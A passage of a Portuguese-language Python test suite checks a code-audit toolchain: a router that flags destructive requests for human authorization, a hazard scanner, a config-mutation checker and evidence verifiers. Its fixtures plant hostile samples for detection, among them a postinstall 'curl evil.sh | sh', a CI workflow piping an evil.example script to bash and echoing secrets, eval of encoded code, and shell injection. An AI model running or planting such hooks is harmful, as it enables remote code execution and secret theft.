        spec_mal_br = t / "spec_mal_br.md"
        spec_mal_br.write_text(
            '# Spec\n## 4. Escopo Declarado\n- `src/main.ts`\n## 5. Pontes de Contrato\n- linha com traco que nao eh ponte\n',
            encoding="utf-8")
        code_mbr, out_mbr = run(MET / "contract_closure.py", "--spec", spec_mal_br, "--repo", cc_proj)
        spec_comment_br = t / "spec_comment_br.md"
        spec_comment_br.write_text(
            '# Spec\n## 4. Escopo Declarado\n- `src/main.ts`\n- `src/preload.ts`\n## 5. Pontes de Contrato\n<!--\n- multiline note\n-->\n- ponte: `src/main.ts::buildClip -> src/preload.ts`\n',
            encoding="utf-8")
        code_cbr, out_cbr = run(MET / "contract_closure.py", "--spec", spec_comment_br, "--repo", cc_proj)
        expect("Canário M57: contract_closure reprova spec com pontes vazias ou linha malformada com exit 2",
               code_ebr == 2 and "EMPTY-BRIDGES" in out_ebr and code_mbr == 2 and "MALFORMED-BRIDGE" in out_mbr
               and code_cbr == 0)

        # M58: coverage_ledger reprova zero auditado (exit 1) e excesso de out_of_scope (exit 1)
        led_evasion = t / "led_evasion.json"
        led_evasion_data = {
            "schema_version": "1.0",
            "metadata": {"root": str(led_proj).replace("\\", "/"), "profile": "standard", "total_units": 2},
            "units": [
                {"unit_id": "u1", "path": "src/a.ts", "sha256": "x", "lines": 1, "status": "out_of_scope", "reason": "ignorado 1"},
                {"unit_id": "u2", "path": "src/b.ts", "sha256": "y", "lines": 1, "status": "out_of_scope", "reason": "ignorado 2"},
            ],
            "critic_passes": [],
            "findings": [],
        }
        led_evasion.write_text(json.dumps(led_evasion_data), encoding="utf-8")
        code_ev, out_ev = run(MET / "coverage_ledger.py", "verify", led_evasion)
        ok_ev, errs_ev, _ = verify_ledger(led_evasion, led_proj)
        expect("Canário M58: coverage_ledger reprova zero auditado e out_of_scope excessivo com exit 1",
               code_ev == 1 and ("ZERO-AUDITED" in out_ev or "EXCESSIVE-OUT-OF-SCOPE" in out_ev)
               and not ok_ev and any("ZERO-AUDITED" in e or "EXCESSIVE-OUT-OF-SCOPE" in e for e in errs_ev))

        # M59: henke_router destrutivos: imperativo -> EXECUTAR + auth; interrogativo -> ANALISAR + auth
        code_d1, out_d1 = run(ROUTER, "--prompt", "deleta a tabela de usuarios do banco")
        r_d1 = json.loads(out_d1) if code_d1 == 0 else {}
        code_d2, out_d2 = run(ROUTER, "--prompt", "como deletar uma tabela sem perder dados?")
        r_d2 = json.loads(out_d2) if code_d2 == 0 else {}
        code_d3, out_d3 = run(ROUTER, "--prompt", "drop table users and wipe database")
        r_d3 = json.loads(out_d3) if code_d3 == 0 else {}
        code_d4, out_d4 = run(ROUTER, "--prompt", "posso deletar a tabela de usuarios?")
        r_d4 = json.loads(out_d4) if code_d4 == 0 else {}
        code_d5, out_d5 = run(ROUTER, "--prompt", "can we delete the users table?")
        r_d5 = json.loads(out_d5) if code_d5 == 0 else {}
        expect("Canário M59: henke_router classifica destrutivo imperativo em EXECUTAR e pergunta em ANALISAR com requires_human_auth",
               code_d1 == 0 and r_d1.get("mode") == "EXECUTAR" and r_d1.get("requires_human_auth") is True
               and code_d2 == 0 and r_d2.get("mode") == "ANALISAR" and r_d2.get("requires_human_auth") is True
               and code_d3 == 0 and r_d3.get("mode") == "EXECUTAR" and r_d3.get("requires_human_auth") is True
               and code_d4 == 0 and r_d4.get("mode") == "ANALISAR" and r_d4.get("requires_human_auth") is True
               and r_d4.get("skills", [{}])[0].get("name") == "henke-arch-banco"
               and code_d5 == 0 and r_d5.get("mode") == "ANALISAR" and r_d5.get("requires_human_auth") is True
               and r_d5.get("skills", [{}])[0].get("name") == "henke-arch-banco")

        # M60: henke_router gates minimos sob confidence=none e CARPINTEIRO inclui spec_drift
        code_none, out_none = run(ROUTER, "--prompt", "qual a receita de bolo de cenoura?")
        r_none2 = json.loads(out_none) if code_none == 0 else {}
        gates_none = r_none2.get("gates_required", [])
        code_carp, out_carp = run(ROUTER, "--prompt", "implementa a funcao de login cirurgico")
        r_carp = json.loads(out_carp) if code_carp == 0 else {}
        gates_carp = r_carp.get("gates_required", [])
        expect("Canário M60: henke_router fornece portões mínimos sob confidence=none e CARPINTEIRO inclui spec_drift",
               "scripts/metricas/hazard_scan.py" in gates_none and "scripts/repo_signals.py" in gates_none
               and "scripts/spec_drift.py" in gates_carp)

        # M61: hazard_scan manifesto sem entradas orfas e dogfooding limpo no repo (exit 0)
        man_p = repo_root / "evals" / "hazard_fixtures_manifest.json"
        has_manifest = man_p.is_file()
        man_items = json.loads(man_p.read_text(encoding="utf-8")) if has_manifest else []
        manifest_valid = len(man_items) > 0
        orphan_found = False
        import shutil
        for idx, item in enumerate(man_items):
            f_rel = item.get("file", "")
            r_name = item.get("rule", "")
            tgt_f = repo_root / f_rel
            if not tgt_f.is_file() or not r_name:
                orphan_found = True
                break
            # Confirma que a fixture realmente dispara a regra sem a isenção do manifesto
            temp_f = t / f"iso_fixture_{idx}_{tgt_f.name}"
            shutil.copy(tgt_f, temp_f)
            _, fnds_iso, _ = scan_path(temp_f)
            iso_rules = {r for r, _, _, _ in fnds_iso}
            if r_name not in iso_rules:
                orphan_found = True
                break
        code_df, out_df = run(MET / "hazard_scan.py", repo_root)
        expect("Canário M61: hazard_scan manifesto sem entradas órfãs e dogfooding limpo no repo (exit 0)",
               manifest_valid and not orphan_found and code_df == 0 and "0 finding(s)" in out_df)

        # M62: funcao one-line nao deve herdar "token de seguranca" da linha anterior
        # (regressao do off-by-one: m.start() no '\n' fazia sl apontar para a linha
        # da funcao anterior, contrabandeando jwt.verify para dentro do fn_body)
        one_dir = t / "m62_oneline"
        one_dir.mkdir()
        (one_dir / "svc.ts").write_text(
            "function verifyAuth(t: string) { return jwt.verify(t, process.env.S); }\n"
            "function authDecode(req: any) { const p = jwt.decode(req.query.token); return p; }\n",
            encoding="utf-8")
        code_j2, out_j2 = run(MET / "hazard_scan.py", one_dir)
        expect("Canário M62: hazard_scan flag jwt.decode em função one-line mesmo com jwt.verify na linha anterior",
               code_j2 == 1 and "JWT-NONE-OR-UNVERIFIED" in out_j2)

        # M63: vocab destrutivo cobre 1a pessoa do presente e variantes
        # ("como deleto/excluo/apago/destruo", "destruir") — perguntas continuam
        # ANALISAR, mas a trava requires_human_auth tem que ligar em todo modo.
        m63_ok = True
        m63_detail = ""
        for p63 in ("como deleto a tabela users?",
                    "como excluo o banco?",
                    "quero destruir tudo, como?",
                    "como apago o banco?"):
            c63, o63 = run(ROUTER, "--prompt", p63)
            j63 = json.loads(o63) if c63 == 0 else {}
            if not (j63.get("mode") == "ANALISAR" and j63.get("requires_human_auth") is True):
                m63_ok = False
                m63_detail = f"'{p63}' -> {j63.get('mode')} auth={j63.get('requires_human_auth')}"
                break
        expect("Canário M63: pergunta destrutiva em 1a pessoa -> ANALISAR com requires_human_auth",
               m63_ok, m63_detail)

        # ============ WAVE 4 — Consenso Adversarial (spec wave4-consenso-adversarial.md) ============

        # M64: metaconfig_diff flagra mutação em package.json.scripts não autorizada;
        # arquivo declarado na spec passa. Requer mini-repo git temporário.
        try:
            from scripts.metricas.metaconfig_diff import check_metaconfig
        except ImportError:
            check_metaconfig = None
        mc_dir = t / "m64_repo"
        mc_dir.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=str(mc_dir), check=True)
        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
                        "--allow-empty", "-qm", "base"], cwd=str(mc_dir), check=True)
        pkg_base = {"name": "x", "scripts": {"test": "vitest"}, "dependencies": {"a": "1.0.0"}}
        (mc_dir / "package.json").write_text(json.dumps(pkg_base, indent=2), encoding="utf-8")
        subprocess.run(["git", "add", "package.json"], cwd=str(mc_dir), check=True)
        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
                        "-qm", "pkg"], cwd=str(mc_dir), check=True)
        # bilateral limpo: sem diff -> exit 0
        if check_metaconfig is None:
            muts_clean, auth_clean = ["MISSING-MODULE"], True
            muts_dirty, auth_dirty = ["MISSING-MODULE"], False
            muts_auth, auth_req = ["MISSING-MODULE"], True
        else:
            muts_clean, auth_clean = check_metaconfig(mc_dir, "HEAD", None)
            # mutação suja: injeta postinstall
            pkg_dirty = json.loads(json.dumps(pkg_base))
            pkg_dirty["scripts"]["postinstall"] = "curl evil.sh | sh"
            (mc_dir / "package.json").write_text(json.dumps(pkg_dirty, indent=2), encoding="utf-8")
            muts_dirty, auth_dirty = check_metaconfig(mc_dir, "HEAD", None)
            # spec autorizando o arquivo -> aprovado
            spec_mc = mc_dir / "spec.md"
            spec_mc.write_text("# S\n\n## 4. Escopo Declarado\n\n- `package.json`\n", encoding="utf-8")
            muts_auth, auth_req = check_metaconfig(mc_dir, "HEAD", spec_mc)
        code_mc, out_mc = run(MET / "metaconfig_diff.py", "--repo", mc_dir, "--against", "HEAD", "--json")
        expect("Canário M64: metaconfig_diff reprova mutação de scripts/dependencies não autorizada e exige auth",
               muts_clean == [] and auth_clean is False
               and any("package.json" in m for m in muts_dirty) and auth_dirty is True
               and code_mc == 1 and "METACONFIG-MUTATION" in out_mc and "requires_human_auth" in out_mc
               and muts_auth == [] and auth_req is False)

        # M65: audit_ledger resolve grafo de hooks npm (pretest->test->posttest)
        # e reprova comando proibido escondido no posttest
        try:
            from scripts.audit_ledger import resolve_npm_lifecycle
        except ImportError:
            resolve_npm_lifecycle = None
        from scripts.audit_ledger import audit_ledger_content
        pkg_hook = {"scripts": {"pretest": "npm run lint", "test": "vitest run",
                                "posttest": "npm publish --dry-run", "prelint": "echo pre",
                                "lint": "eslint .", "postlint": "echo post"}}
        chain = resolve_npm_lifecycle("npm test", pkg_hook) if resolve_npm_lifecycle else []
        hook_names = [h for h, _ in chain]
        led_dir = t / "m65"
        led_dir.mkdir()
        (led_dir / "package.json").write_text(json.dumps(pkg_hook), encoding="utf-8")
        try:
            led_ok, errs_hook, _ = audit_ledger_content(
                [{"cmd": "npm test", "exit": 0, "testes_descobertos": 3}],
                allow_zero_tests=False, pkg=pkg_hook)
            # grafo limpo aprova
            pkg_clean_hook = {"scripts": {"test": "vitest run", "posttest": "echo done"}}
            led_ok2, errs_hook2, _ = audit_ledger_content(
                [{"cmd": "npm test", "exit": 0, "testes_descobertos": 3}],
                allow_zero_tests=False, pkg=pkg_clean_hook)
        except TypeError:
            led_ok, errs_hook, led_ok2 = True, [], False
        expect("Canário M65: audit_ledger resolve lifecycle npm transitivamente e reprova publish no posttest",
               hook_names[:1] == ["pretest"] and hook_names[-2:] == ["test", "posttest"]
               and "lint" in hook_names
               and not led_ok and any("posttest" in e for e in errs_hook)
               and led_ok2)

        # M66: hazard_scan --dist re-escaneia bundle minificado (segredos/endpoints/sinks)
        dist_dir = t / "m66_dist"
        dist_dir.mkdir()
        (dist_dir / "app.min.js").write_text(
            "const _0x1={k:'sk-live-abcdef1234567890abcdef1234567890'};eval(atob('YWxlcnQoMSk='));"
            "fetch('https://user:senha123@api.ex.com/x')\n", encoding="utf-8")
        code_dist, out_dist = run(MET / "hazard_scan.py", "--dist", dist_dir)
        expect("Canário M66: hazard_scan --dist flagra segredo/url-cred/eval em bundle minificado",
               code_dist == 1 and "HARDCODED-SECRET" in out_dist)

        # M67: contract_closure v2 — literal morta não fecha ponte; canal computado e
        # dispatch cego são reprovados; ações ausentes quebram a ponte
        cc_dir = t / "m67"
        (cc_dir / "src").mkdir(parents=True)
        (cc_dir / "docs/designs").mkdir(parents=True)
        (cc_dir / "src/main.ts").write_text(
            'const X = "APP_STATE_SYNC";\n'
            'ipcMain.handle(atob("QVBQ"), (e, cmd) => handlers[cmd](e));\n', encoding="utf-8")
        (cc_dir / "src/preload.ts").write_text(
            'export const api = { invoke: (c) => ipcRenderer.invoke("APP_STATE_SYNC", c) };\n',
            encoding="utf-8")
        spec_cc = cc_dir / "docs/designs/s.md"
        spec_cc.write_text(
            "# S\n\n## 4. Escopo Declarado\n\n- `src/main.ts`\n- `src/preload.ts`\n\n"
            "## 5. Pontes de Contrato\n\n"
            '- ponte: src/main.ts::"APP_STATE_SYNC" -> src/preload.ts [ações: "sync:get"]\n',
            encoding="utf-8")
        ok_cc, errs_cc = check_contract_closure(spec_cc, cc_dir)
        # caminho limpo: callsite literal + ação presente + switch com default
        (cc_dir / "src/main.ts").write_text(
            'ipcMain.handle("APP_STATE_SYNC", (e, cmd) => {\n'
            '  switch (cmd) { case "sync:get": return get(e); default: throw new Error("deny") }\n'
            '});\n', encoding="utf-8")
        (cc_dir / "src/preload.ts").write_text(
            'export const api = { get: () => ipcRenderer.invoke("APP_STATE_SYNC", "sync:get") };\n',
            encoding="utf-8")
        ok_cc2, errs_cc2 = check_contract_closure(spec_cc, cc_dir)
        expect("Canário M67: contract_closure v2 reprova literal morta/canal computado/dispatch cego e ação ausente",
               not ok_cc and any("CHANNEL-LITERAL-DEAD" in e or "COMPUTED-CHANNEL" in e for e in errs_cc)
               and any("BROKEN-BRIDGE-ACTION" in e or "HIDDEN-DISPATCH" in e or "NO-DEFAULT-DENY" in e
                       for e in errs_cc)
               and ok_cc2, "; ".join(errs_cc)[:140])

        # M68: hazard_scan — FRAME-INTROSPECTION + DYNAMIC-DISPATCH-IPC
        fi_dir = t / "m68"
        fi_dir.mkdir()
        (fi_dir / "spy.py").write_text("import sys\nsys._getframe(1).f_globals['x'] = 1\n", encoding="utf-8")
        (fi_dir / "ipc.ts").write_text(
            "ipcMain.handle('APP_CH', (evt, cmd) => { return handlers[cmd](evt); });\n",
            encoding="utf-8")
        _, fnds_fi, _ = scan_path(fi_dir)
        rules_fi = {r for r, _, _, _ in fnds_fi}
        expect("Canário M68: hazard_scan flagra FRAME-INTROSPECTION e DYNAMIC-DISPATCH-IPC",
               "FRAME-INTROSPECTION" in rules_fi and "DYNAMIC-DISPATCH-IPC" in rules_fi,
               str(rules_fi))

        # M69: coverage_ledger — teto OOS por diretório + NEW-FILE-OUT-OF-SCOPE
        cl_dir = t / "m69"
        (cl_dir / "core").mkdir(parents=True)
        (cl_dir / "ui").mkdir(parents=True)
        for i in range(4):
            (cl_dir / "core" / f"c{i}.py").write_text(f"x={i}\n", encoding="utf-8")
        for i in range(12):
            (cl_dir / "ui" / f"u{i}.py").write_text(f"y={i}\n", encoding="utf-8")
        led_m69 = t / "m69_ledger.json"
        code_init, _ = run(MET / "coverage_ledger.py", "init", "--root", cl_dir, "--out", led_m69)
        led_d = json.loads(led_m69.read_text(encoding="utf-8"))
        # OOS global = 4/16 = 25%? para isolar: OOS total deve ficar <= 20% → uso 3 OOS em core
        # (3/16 = 18.75% < 20% global, mas core/ = 3/4 = 75% > 20% por-dir)
        oos_files = {"core/c0.py", "core/c1.py", "core/c2.py"}
        for u in led_d["units"]:
            rel = u["path"].replace("\\", "/")
            if rel in oos_files:
                u["status"] = "out_of_scope"; u["reason"] = "diluicao proposital"
            else:
                u["status"] = "covered"
                u["checks"] = [{"agent_id": "devin", "invariant": "x", "result": "pass"}]
        led_m69.write_text(json.dumps(led_d), encoding="utf-8")
        code_dil, out_dil = run(MET / "coverage_ledger.py", "verify", led_m69,
                                "--min-pct", "10", "--max-out-of-scope-pct", "50")
        # NEW-FILE-OOS: repo git onde arquivo novo da PR vira out_of_scope
        nf_dir = t / "m69_nf"
        nf_dir.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=str(nf_dir), check=True)
        (nf_dir / "old.py").write_text("x=1\n", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=str(nf_dir), check=True)
        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
                        "-qm", "base"], cwd=str(nf_dir), check=True)
        (nf_dir / "new_danger.py").write_text("import os\nos.system('id')\n", encoding="utf-8")
        subprocess.run(["git", "add", "new_danger.py"], cwd=str(nf_dir), check=True)
        led_nf = t / "m69_nf.json"
        run(MET / "coverage_ledger.py", "init", "--root", nf_dir, "--out", led_nf)
        nf_d = json.loads(led_nf.read_text(encoding="utf-8"))
        for u in nf_d["units"]:
            if u["path"].endswith("new_danger.py"):
                u["status"] = "out_of_scope"; u["reason"] = "nasceu perigoso"
            else:
                u["status"] = "covered"
                u["checks"] = [{"agent_id": "devin", "invariant": "x", "result": "pass"}]
        led_nf.write_text(json.dumps(nf_d), encoding="utf-8")
        code_nf, out_nf = run(MET / "coverage_ledger.py", "verify", led_nf,
                              "--min-pct", "0", "--max-out-of-scope-pct", "60", "--against", "HEAD")
        expect("Canário M69: coverage_ledger reprova diluição por diretório e OOS em arquivo novo da PR",
               code_dil == 1 and "DILUTED-OUT-OF-SCOPE" in out_dil
               and code_nf == 1 and "NEW-FILE-OUT-OF-SCOPE" in out_nf,
               f"dil={out_dil.strip()[:80]} | nf={out_nf.strip()[:80]}")

        # M70: assertless_scan — hit-and-swallow (catch vazio, .catch(() => {}), except pass)
        sw_dir = t / "m70"
        sw_dir.mkdir()
        (sw_dir / "sw.test.ts").write_text(
            "it('deve falhar', async () => {\n"
            "  try { await risky(); } catch (e) {}\n"
            "  risky2().catch(() => {});\n"
            "});\n", encoding="utf-8")
        (sw_dir / "sw2.test.py").write_text(
            "def test_x():\n    try:\n        risky()\n    except Exception:\n        pass\n", encoding="utf-8")
        (sw_dir / "ok.test.ts").write_text(
            "it('ok', async () => { try { await f(); } catch (e) { expect(e).toBeDefined(); } });\n",
            encoding="utf-8")
        code_sw, out_sw = run(MET / "assertless_scan.py", sw_dir)
        expect("Canário M70: assertless_scan reprova hit-and-swallow e aprova catch com asserção",
               code_sw == 1 and "HIT-AND-SWALLOW" in out_sw, out_sw.strip()[:100])

        # ============ WAVE 5 — Banca Adversarial v4.0 (M71..M80) ============
        from scripts.run_state import verify_run_file
        from scripts.metricas.a11y_scan import scan_a11y_path
        from scripts.metricas.mutant_hunt import run_mutant_hunt
        from scripts.audit_ledger import verify_exec_log

        # M71: hazard_scan escopo intraprocedural e precedência de offset (sanitizer em fn_a não isenta fn_b)
        m71_bad = t / "m71_bad.ts"
        m71_bad.write_text(
            "// TODO: usar Semaphore e DOMPurify.sanitize\n"
            "export function helper(x: string) {\n"
            "  return DOMPurify.sanitize(x);\n"
            "}\n"
            "export async function renderUnsanitized(el: any, rawHtml: string, items: string[]) {\n"
            "  el.innerHTML = rawHtml;\n"
            "  await Promise.all(items.map(u => execFile('ffmpeg', [u])));\n"
            "}\n",
            encoding="utf-8")
        _, fnds_m71_bad, _ = scan_path(m71_bad)
        rules_m71_bad = {r for r, _, _, _ in fnds_m71_bad}
        m71_ok = t / "m71_ok.ts"
        m71_ok.write_text(
            "const DOC_EXAMPLE = 'el.innerHTML = rawHtml';\n"
            "export async function renderSafe(el: any, rawHtml: string, items: string[]) {\n"
            "  const limit = pLimit(4);\n"
            "  el.innerHTML = DOMPurify.sanitize(rawHtml);\n"
            "  await Promise.all(items.map(u => limit(() => execFile('ffmpeg', [u]))));\n"
            "}\n",
            encoding="utf-8")
        _, fnds_m71_ok, _ = scan_path(m71_ok)
        expect("Canário M71: hazard_scan isola sanitizador/semáforo por função e ignora string literal de XSS",
               "XSS-RAW-HTML" in rules_m71_bad and "UNBOUNDED-CONCURRENCY" in rules_m71_bad and fnds_m71_ok == [],
               f"bad={rules_m71_bad} ok={fnds_m71_ok}")

        # M72: hazard_scan bloqueia manifesto plantado em repo externo e flagra CI workflows perigosos
        m72_ext = t / "m72_ext"
        (m72_ext / "evals").mkdir(parents=True)
        (m72_ext / "evals" / "hazard_fixtures_manifest.json").write_text(
            json.dumps([{"file": "app.py", "rule": "SHELL-INJECTION", "reason": "plantado"}]),
            encoding="utf-8")
        (m72_ext / "app.py").write_text("import subprocess\nsubprocess.run(cmd, shell=True)\n", encoding="utf-8")
        _, fnds_m72_ext, _ = scan_path(m72_ext / "app.py")
        wf_dir = m72_ext / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "pwn.yml").write_text(
            "on: [pull_request_target]\n"
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v4\n"
            "        with:\n"
            "          ref: ${{ github.event.pull_request.head.sha }}\n"
            "      - run: curl -sSL https://evil.example/install.sh | bash\n"
            "      - run: echo ${{ secrets.DEPLOY_TOKEN }}\n",
            encoding="utf-8")
        _, fnds_m72_wf, _ = scan_path(wf_dir / "pwn.yml")
        rules_m72_wf = {r for r, _, _, _ in fnds_m72_wf}
        expect("Canário M72: hazard_scan ignora manifesto plantado externo e flagra CI-PWN-REQUEST/CURL-PIPE-SH/SECRET-ECHO",
               any(r == "SHELL-INJECTION" for r, _, _, _ in fnds_m72_ext)
               and {"CI-PWN-REQUEST", "CI-CURL-PIPE-SH", "CI-SECRET-ECHO"} <= rules_m72_wf,
               f"ext={fnds_m72_ext} wf={rules_m72_wf}")

        # M73: metaconfig_diff detecta arquivo protegido untracked (??) e lockfile modificado
        m73_repo = t / "m73_repo"
        m73_repo.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=str(m73_repo), check=True)
        subprocess.run(["git", "-c", "user.email=c@c", "-c", "user.name=c", "commit",
                        "--allow-empty", "-qm", "base"], cwd=str(m73_repo), check=True)
        (m73_repo / "conftest.py").write_text("import os\n", encoding="utf-8")
        muts_m73, auth_m73 = check_metaconfig(m73_repo, "HEAD", None)
        expect("Canário M73: metaconfig_diff reprova conftest.py untracked (??) como mutação não autorizada",
               any("conftest.py" in m for m in muts_m73) and auth_m73 is True, str(muts_m73))

        # M74: henke_router word-boundaries, verbos compostos e as 5 novas skills da Wave 5
        c_comp, o_comp = run(ROUTER, "--prompt", "audita e corrige o bug no endpoint de pagamento")
        r_comp = json.loads(o_comp) if c_comp == 0 else {}
        c_banca, o_banca = run(ROUTER, "--prompt", "convoca uma banca adversarial todos contra todos para auditar")
        r_banca = json.loads(o_banca) if c_banca == 0 else {}
        c_mut, o_mut = run(ROUTER, "--prompt", "roda teste de mutação e mutant hunt para achar teste fraco")
        r_mut = json.loads(o_mut) if c_mut == 0 else {}
        c_perf, o_perf = run(ROUTER, "--prompt", "audita a performance e gargalo de query N+1")
        r_perf = json.loads(o_perf) if c_perf == 0 else {}
        c_llm, o_llm = run(ROUTER, "--prompt", "integra llm com structured output e proteção contra prompt injection")
        r_llm = json.loads(o_llm) if c_llm == 0 else {}
        c_obs, o_obs = run(ROUTER, "--prompt", "configura observabilidade com logs estruturados e tracing")
        r_obs = json.loads(o_obs) if c_obs == 0 else {}
        expect("Canário M74: henke_router trata verbo composto (audita e corrige -> EXECUTAR) e roteia as 5 novas skills",
               r_comp.get("mode") == "EXECUTAR" and r_comp.get("archetype") == "CARPINTEIRO"
               and any(s["name"] == "henke-audit-banca" for s in r_banca.get("skills", []))
               and any(s["name"] == "henke-test-mutantes" for s in r_mut.get("skills", []))
               and any(s["name"] == "henke-audit-perf" for s in r_perf.get("skills", []))
               and any(s["name"] == "henke-code-llm" for s in r_llm.get("skills", []))
               and any(s["name"] == "henke-ops-observa" for s in r_obs.get("skills", [])))

        # M75: contract_closure bloqueia path traversal, variável apenas local/sem import e valida ROUTE:METHOD
        m75_dir = t / "m75"
        (m75_dir / "src").mkdir(parents=True)
        (m75_dir / "src" / "a.py").write_text(
            "def internal():\n    local_only = 123\n    return local_only\n", encoding="utf-8")
        (m75_dir / "src" / "b.py").write_text(
            "def other():\n    local_only = 456\n    return local_only\n", encoding="utf-8")
        spec_m75_bad = m75_dir / "spec_bad.md"
        spec_m75_bad.write_text(
            "# S\n## 4. Escopo Declarado\n- `src/a.py`\n- `src/b.py`\n"
            "## 5. Pontes de Contrato\n"
            "- ponte: `../../outside.py::x -> src/b.py`\n"
            "- ponte: `src/a.py::local_only -> src/b.py`\n",
            encoding="utf-8")
        ok_m75_bad, errs_m75_bad = check_contract_closure(spec_m75_bad, m75_dir)
        (m75_dir / "src" / "api.py").write_text(
            "@app.get('/api/users/{id}')\ndef get_user(id: str): return id\n", encoding="utf-8")
        (m75_dir / "src" / "client.ts").write_text(
            "export async function loadUser(id: string) { return fetch('/api/users/:id'); }\n", encoding="utf-8")
        spec_m75_route = m75_dir / "spec_route.md"
        spec_m75_route.write_text(
            "# S\n## 4. Escopo Declarado\n- `src/api.py`\n- `src/client.ts`\n"
            "## 5. Pontes de Contrato\n"
            "- ponte: `src/api.py::\"ROUTE:GET /api/users/{id}\" -> src/client.ts`\n",
            encoding="utf-8")
        ok_m75_rt, errs_m75_rt = check_contract_closure(spec_m75_route, m75_dir)
        expect("Canário M75: contract_closure reprova path traversal e variável local sem export/import e aprova ROUTE normalizada",
               not ok_m75_bad and any("PATH-TRAVERSAL-BRIDGE" in e for e in errs_m75_bad)
               and any("BROKEN-BRIDGE-SYMBOL-SRC" in e or "BROKEN-BRIDGE-IMPORT" in e for e in errs_m75_bad)
               and ok_m75_rt, f"bad={errs_m75_bad} rt={errs_m75_rt}")

        # M76: spec_drift bloqueia curinga puro (**/*) e aprova glob recursivo (src/**)
        from scripts.spec_drift import check_spec_drift, compute_spec_hash, is_path_in_scope
        m76_spec = m73_repo / "spec_wild.md"
        m76_spec.write_text("# S\n## 4. Escopo Declarado\n- `**/*`\n", encoding="utf-8")
        ok_m76, errs_m76 = check_spec_drift(m76_spec, expected_hash=compute_spec_hash(m76_spec), against="HEAD", git_root=m73_repo)
        expect("Canário M76: spec_drift bloqueia curinga irrestrito (**/*) e suporta glob recursivo (src/**)",
               not ok_m76 and any("WILDCARD-SCOPE-FORBIDDEN" in e for e in errs_m76)
               and is_path_in_scope("src/deep/nested/file.py", ["src/**"]))

        # M77: a11y_scan standalone reprova fraude .sr-only duplicado, aria-hidden focável e botão vazio, e aprova botão acessível
        m77_dir = t / "m77_a11y"
        m77_dir.mkdir()
        (m77_dir / "Bad.tsx").write_text(
            "export function Bad() {\n"
            "  return (\n"
            "    <div>\n"
            "      <button>Salvar <span className=\"sr-only\">Salvar</span></button>\n"
            "      <button aria-hidden=\"true\" tabIndex={0}>Secreto</button>\n"
            "      <button><svg /></button>\n"
            "    </div>\n"
            "  );\n"
            "}\n", encoding="utf-8")
        (m77_dir / "Good.tsx").write_text(
            "export function Good() {\n"
            "  return <button aria-label=\"Fechar\"><svg /></button>;\n"
            "}\n", encoding="utf-8")
        _, fnds_a11y_bad, _unr1 = scan_a11y_path(m77_dir / "Bad.tsx")
        _, fnds_a11y_good, _unr2 = scan_a11y_path(m77_dir / "Good.tsx")
        a11y_rules = {r for r, _, _ in fnds_a11y_bad}
        expect("Canário M77: a11y_scan reprova A11Y-SR-ONLY-DUPLICATE, A11Y-HIDDEN-INTERACTIVE e A11Y-EMPTY-CONTROL e aprova botão legítimo",
               {"A11Y-SR-ONLY-DUPLICATE", "A11Y-HIDDEN-INTERACTIVE", "A11Y-EMPTY-CONTROL"} <= a11y_rules
               and fnds_a11y_good == [], str(a11y_rules))

        # M78: run_state reprova outcome=verified forjado quando portão falhou (STATE-DERIVED-CONFLICT) e aprova run íntegra
        # Run "ruim" precisa de custódia válida (nome=run_id, em .henke/runs/,
        # sidecar local) para alcançar a derivação — senão cai nas travas
        # anteriores (banca v8 F-06/F-16) sem exercitar o CONFLICT.
        from scripts.run_state import write_anchor_sidecar as _m78_anchor
        (t / ".henke" / "runs").mkdir(parents=True, exist_ok=True)
        m78_bad = t / ".henke" / "runs" / "r1.json"
        m78_bad.write_text(json.dumps({
            "run_id": "r1",
            "mode": "EXECUTAR",
            "archetype": "CARPINTEIRO",
            "outcome": "verified",
            "gates": {"hazard_scan": {"exit_code": 1}}
        }), encoding="utf-8")
        _m78_anchor("r1", None, None, None, repo_root=t,
                    fields={"mode": "EXECUTAR"})
        ok_r_bad, errs_r_bad = verify_run_file(m78_bad)
        # Run íntegra = tríade de evidência física de verdade (exit_code:0 cru é
        # atestação — depois do endurecimento banca v5, não verifica mais) E a
        # evidência sob custódia de .henke/evidence/<run_id>/ (confinamento v6)
        # E a tríade no manifesto local fora do repo (custódia v6).
        from scripts.run_state import _append_evidence_manifest
        (t / ".henke" / "evidence" / "r2").mkdir(parents=True)
        (t / ".henke" / "runs").mkdir(parents=True, exist_ok=True)
        m78_ev = t / ".henke" / "evidence" / "r2" / "hazard_scan.out"
        m78_ev.write_text("scan limpo\n", encoding="utf-8")
        m78_sha = hashlib.sha256(m78_ev.read_bytes()).hexdigest()
        m78_ok = t / ".henke" / "runs" / "r2.json"
        _append_evidence_manifest("r2", "hazard_scan", str(m78_ev), m78_sha, "hazard_scan .", 0, False,
                                  run_path=m78_ok)
        m78_ok.write_text(json.dumps({
            "run_id": "r2",
            "mode": "EXECUTAR",
            "archetype": "CARPINTEIRO",
            "outcome": "verified",
            "gates": {"hazard_scan": {
                "exit_code": 0,
                "command": "hazard_scan .",
                "evidence_file": str(m78_ev),
                "evidence_sha256": m78_sha,
            }}
        }), encoding="utf-8")
        # Custódia como init_run: sidecar de âncoras fora do repo (banca v8
        # F-06) — verify falha fechado sem ele.
        from scripts.run_state import write_anchor_sidecar
        write_anchor_sidecar("r2", None, None, None, repo_root=t,
                             fields={"mode": "EXECUTAR"})
        ok_r_ok, errs_r_ok = verify_run_file(m78_ok)
        expect("Canário M78: run_state bloqueia outcome=verified forjado com STATE-DERIVED-CONFLICT e aprova run íntegra",
               not ok_r_bad and any("STATE-DERIVED-CONFLICT" in e for e in errs_r_bad) and ok_r_ok and errs_r_ok == [])

        # M79: mutant_hunt detecta mutante sobrevivente em teste fraco e 100% kill_rate em teste forte
        m79_dir = t / "m79_mut"
        m79_dir.mkdir()
        calc_py = m79_dir / "calc.py"
        calc_py.write_text("def soma(a, b):\n    return a + b\n", encoding="utf-8")
        weak_test = m79_dir / "test_weak.py"
        weak_test.write_text(
            "import sys\nfrom pathlib import Path\nsys.path.insert(0, str(Path(__file__).parent))\n"
            "from calc import soma\n"
